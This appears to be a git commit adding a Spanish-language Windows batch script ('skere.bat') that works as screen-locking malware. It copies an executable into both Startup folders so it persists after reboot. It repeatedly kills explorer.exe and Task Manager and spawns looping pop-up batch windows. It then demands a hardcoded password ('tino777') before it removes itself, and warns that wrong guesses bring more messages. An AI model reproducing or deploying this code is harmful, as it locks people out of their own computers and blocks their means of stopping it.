e616a79a9802d255a380fedccb62ce59786f604a
dumbbass <41546285+developingrxn@users.noreply.github.com>
2019-03-07 21:47:38 -0300

    Add files via upload

---
+++ skere.bat
@@ -0,0 +1,121 @@
+﻿::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSjk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJgZksaHErTXA==
+::ZQ05rAF9IBncCkqN+0xwdVsFAlTMbCXqZg==
+::ZQ05rAF9IAHYFVzEqQIXDS8UfiGpCCuYKYx8
+::eg0/rx1wNQPfEVWB+kM9LVsJDDCLMmSJDadcrqjv/KSAqkIOQPE3Nozdug==
+::fBEirQZwNQPfEVWB+kM9LVsJDDCLMmSJDadcrqjv/KSAqkIOQPE3Nozdug==
+::cRolqwZ3JBvQF1fEqQIEIRVbfw+QfC36EqZS7+D0/P6UqgMeUoI=
+::dhA7uBVwLU+EWG2N+k0DIwkUCkSWLyW9DroP/PvzoemBwg==
+::YQ03rBFzNR3SWATEwEs+JyhfXkTEfH+pSLIU5/vv/OLJoUt9
+::dhAmsQZ3MwfNWATEwEs+JyhfXkTEfH+pSLIU5/vv/OLJoUt9
+::ZQ0/vhVqMQ3MEVWAtB9wHBJaQzeJLiv8RqEPpu/z4PmTsUVTV+Rf
+::Zg8zqx1/OA3MEVWAtB9wHBJaQzeJLiv8RqEPpu/z4PmTsUVTV+Rf
+::dhA7pRFwIByZRRmw/Uw/GxBGDELCKHj0Ab0T+/zo56SEpC0=
+::Zh4grVQjdCyDJGyX8VAjFCh3YjimOXixEroM1Nv4/eOXtkQTU949eZvY0oieJfIA41bwcJgu33tmteg+CRxdehu/fUExsWsi
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+echo off
+cls
+:: EMPIEZA LA MAGIA (SCRIPTS PARA PERSISTENCIA)
+SET molestorndm=%RANDOM%XXXXMadeByTinoXXXX%RANDOM%HGJT4VY3%RANDOM%%RANDOM%5BBBS%RANDOM%FV%RANDOM%XX%RANDOM%XDFT%RANDOM%BT6432C%RANDOM%FAVV%RANDOM%fsos%RANDOM%34B34B%RANDOM%DAD%RANDOM%%RANDOM%FDDD%RANDOM%FFD%RANDOM%
+echo off
+cls
+echo :s >> %temp%\mss.bat >> %molestorndm%.bat
+echo echo echo off >> %temp%\mss.bat >> %molestorndm%.bat
+echo echo cls >> %temp%\mss.bat
+echo echo echo INICIA SESI¢N >> %temp%\mss.bat >> %molestorndm%.bat
+echo echo title INICIA SESI¢N >> %temp%\mss.bat >> %molestorndm%.bat
+echo echo ping localhost -n 2 >nul >> %temp%\mss.bat >> %molestorndm%.bat
+echo echo exit >> %temp%\mss.bat >> %molestorndm%.bat
+echo start %temp%\mss.bat >> %molestorndm%.bat
+echo ping localhost -n 4 >nul >> %molestorndm%.bat
+echo goto s >> %molestorndm%.bat
+start /min %temp%\%molestorndm%.bat
+::::::::::::::::::::::::::::::::
+:: PERSISTANCE AFTER SHUTDOWN ::
+::::::::::::::::::::::::::::::::
+copy MCRegedits.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+copy MCRegedits.exe C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+:::::::::
+:: CIF ::
+:::::::::
+copy MCRegedits.exe %temp%
+SET cifrandom=%random%MadeByTino%random%FF%random%FRV%random%ERVWZ%random%TYN%random%456VVV%random%ZZZEZ%random%VKJVEJJV%random%LDKIADI%random%DJDHE4H%random%3458347%random%73626%random%7235452%random%U345FCNC3%random%757HC32V23JVJ%random%U43VH23%random%
+echo :cif >> %temp%\%cifrandom%.bat
+echo taskkill /f /im "explorer.exe" >> %temp%\%cifrandom%.bat
+echo taskkill /f /im "taskmgr.exe" >> %temp%\%cifrandom%.bat
+echo echo off >> %temp%\%cifrandom%.bat
+echo tasklist /FI "IMAGENAME eq MCRegedits.exe" /FO CSV > search.log >> %temp%\%cifrandom%.bat
+echo FOR /F %%A IN (search.log) DO IF %%~zA EQU 0 GOTO end >> %temp%\%cifrandom%.bat
+echo start MCRegedits.exe >> %temp%\%cifrandom%.bat
+echo goto cif >> %temp%\%cifrandom%.bat
+echo :end >> %temp%\%cifrandom%.bat
+echo del search.log >> %temp%\%cifrandom%.bat
+echo goto cif >> %temp%\%cifrandom%.bat
+start /min %temp%\%cifrandom%.bat
+
+:: GENERAR CONTRA RANDOM ( NO FUNCA )
+SET passw=%random%
+echo %passw% >> %temp%\password.is.%passw%.tino
+
+:start
+start /min %temp%\%cifrandom%.bat
+start /min %temp%\%molestorndm%.bat
+cls
+color f0
+echo ^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=
+echo            Al parecer necesitas iniciar sesi¢n
+echo             Usa la contrase¤a que te han dado.
+echo.
+echo         Si reinicias la PC o cierras el programa
+echo                 va a aparecer de nuevo
+echo                  Script made by Tino
+echo ^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=^=
+SET /P psw=Ingresa la contrase¤a:
+IF %psw%==tino777 goto :done
+) ELSE (
+goto :nope
+
+:done
+cls
+echo Contrase¤a correcta!
+echo Felicidades.
+cd %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+del MCRegedits.exe
+cd %temp%
+del MCRegedits.exe
+cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+del MCRegedits.exe
+taskkill /f /im "cmd.exe"
+taskkill /f /im "MCRegedits.exe"
+pause
+exit
+
+:nope
+cls
+echo Contrase¤a incorrecta!
+echo Intentalo de nuevo
+echo Mientras mas contrase¤as incorrectas, mas mensajes!
+echo.
+echo Presione cualquier tecla para volver al inicio
+pause >nul
+start %temp%\%molestorndm%.bat
+goto :start
+pause
